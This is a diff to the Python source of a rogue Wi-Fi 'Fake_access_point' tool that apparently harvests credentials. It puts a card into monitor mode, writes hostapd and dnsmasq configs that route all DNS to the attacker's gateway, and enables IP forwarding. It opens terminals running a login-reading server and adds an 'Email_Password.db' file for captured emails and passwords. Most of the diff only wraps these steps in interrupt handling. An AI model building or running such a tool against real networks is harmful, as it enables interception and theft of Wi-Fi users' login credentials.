@@ -52,7 +52,8 @@ Check_Packages()
 class Fake_access_point:
      
       def __init__(self):
-          self.args_Control()                 
+          self.args_Control()  
+          self.Show_ap_all()               
           if self.args.List :
              all_Interface = os.listdir('/sys/class/net/') 
              print("[+] List of Devices avelable "+'\n'+('='*20)+'\n')
@@ -74,8 +75,7 @@ class Fake_access_point:
              os.system(" sudo iw dev wlan0 interface add wlansnake type station")  #sudo iw dev Sanke1 del 
              print("\n[+] Snake_AP add 'wlansnake'  as Virtual Interfaces ......!! ")
           else:
-                pass 
-          self.Show_ap_all()
+                pass       
           self.Clean_IP_Table()
           self.Create_Fake()
           self.Create_File_hostapd()     
@@ -97,16 +97,19 @@ class Fake_access_point:
               call_termminal = subprocess.call( _ ,shell=True,stderr=subprocess.PIPE,stdout=PIPE) 
               time.sleep(0.30)      
       def Create_Fake (self):
-         
-          ifconfig_command  = [   
+          try: 
+              ifconfig_command  = [   
                                       
                                "sudo airmon-ng start "
                               ]
-          for _ in  ifconfig_command :
-             call_termminal = subprocess.call( _ +f'{self.args.Interface}',shell=True,stderr=subprocess.PIPE,stdout=PIPE) 
-             time.sleep(2)
-          print("[+] Interface is in monitor Mode")
+              for _ in  ifconfig_command :
+                  call_termminal = subprocess.call( _ +f'{self.args.Interface}',shell=True,stderr=subprocess.PIPE,stdout=PIPE) 
+                  time.sleep(2)
+              print("[+] Interface is in monitor Mode")
+          except KeyboardInterrupt: 
+              exit()
       def Create_File_hostapd(self):
+          try:
               if os.path.exists(Curent_dir+"/Snake_config/") :
                  pass
               else:                 
@@ -132,8 +135,11 @@ class Fake_access_point:
                                           "ignore_broadcast_ssid=0"+"\n"\
                                          )  
               group  = "chown "+ user_name+ ":"+user_name +" ./hostapd.conf" 
-              os.system(group)           
+              os.system(group)   
+          except KeyboardInterrupt:
+                 exit()        
       def Create_dns_masq(self):
+          try:
               with open("./dnsmasq.conf",'w') as dnsmasq:
                     
                    dnsmasq.write(
@@ -152,17 +158,20 @@ class Fake_access_point:
                                       dnsmasq.write("address=/#/192.168.1.1"+"\n")   
               group  = "chown "+ user_name+ ":"+user_name +" "+"dnsmasq.conf" 
               os.system(group) 
+          except KeyboardInterrupt:
+                exit() 
       def Start_InterFace(self):
-          all_Interface = os.listdir('/sys/class/net/') 
-          for interface in all_Interface :
-              try:  
-                 command = 'ping -I '+f'{interface}'+' -w1 www.google.com  >/dev/null 2>&1 '   
-                 communicate = os.system(command) 
-                 if communicate  == 0 :
-                    break          
-              except Exception  :
-                continue                      
-          Set_Up_access_point = [
+          try:
+             all_Interface = os.listdir('/sys/class/net/') 
+             for interface in all_Interface :
+                 try:  
+                    command = 'ping -I '+f'{interface}'+' -w1 www.google.com  >/dev/null 2>&1 '   
+                    communicate = os.system(command) 
+                    if communicate  == 0 :
+                       break          
+                 except Exception  :
+                    continue                      
+             Set_Up_access_point = [
 
                                   "ifconfig "+f'{self.args.Interface}'+'mon'+" up 192.168.1.1 netmask 255.255.255.0",
                                   "route add -net 192.168.1.0 netmask 255.255.255.0 gw\
@@ -176,10 +185,12 @@ class Fake_access_point:
                                   "echo 1 > /proc/sys/net/ipv4/ip_forward",
                                 ]
                                          
-          for _ in Set_Up_access_point :
-              call_termminal = subprocess.call( _ ,shell=True,stderr=subprocess.PIPE,stdout=PIPE)
+             for _ in Set_Up_access_point :
+                call_termminal = subprocess.call( _ ,shell=True,stderr=subprocess.PIPE,stdout=PIPE)
+          except KeyboardInterrupt:
+                exit()
       def call_tremmial(self):
-             
+          try:   
              subprocess.call(["chmod +x "+Curent_dir+"/Snake_Package/Host_apd.py"],shell=True)
              order = Curent_dir+"/Snake_Package/Host_apd.py"             
              command_proc = ' gnome-terminal  -e ' +'"' + order  +'"'                  
@@ -201,8 +212,14 @@ class Fake_access_point:
                 command_run = Curent_dir+"/Snake_Package/ServerLog/Strem_db_read.py"
                 command_proc3 = ' gnome-terminal  -e ' +'"' + command_run +'"'               
                 call_termminal = subprocess.call(command_proc3,shell=True,stderr=subprocess.PIPE)
-                group  = "chown "+ user_name+ ":"+user_name +" "+  Curent_dir+"/Snake_Package/ServerLog/LOGIN_DB.txt" 
-                os.system(group)
+                if os.path.exists(Curent_dir+"/Snake_Package/ServerLog/LOGIN_DB.txt") :
+                   group  = "chown "+ user_name+ ":"+user_name +" "+  Curent_dir+"/Snake_Package/ServerLog/LOGIN_DB.txt" 
+                   os.system(group)
+                with open(Curent_dir+'/Email_Password.db','a') as DB_PASS :
+                   group1  = "chown "+ user_name+ ":"+user_name +" "+  Curent_dir+"/Email_Password.db" 
+                   os.system(group1)
+          except KeyboardInterrupt :
+                 exit()
       def args_Control(self):
             parser = argparse.ArgumentParser( description="Usage: <OPtion> <arguments> ")
             parser.add_argument( '-I  ',"--Interface" ,metavar='' , action=None,required = False ,help="Interface act AP 'Support AP Mode'" )                           
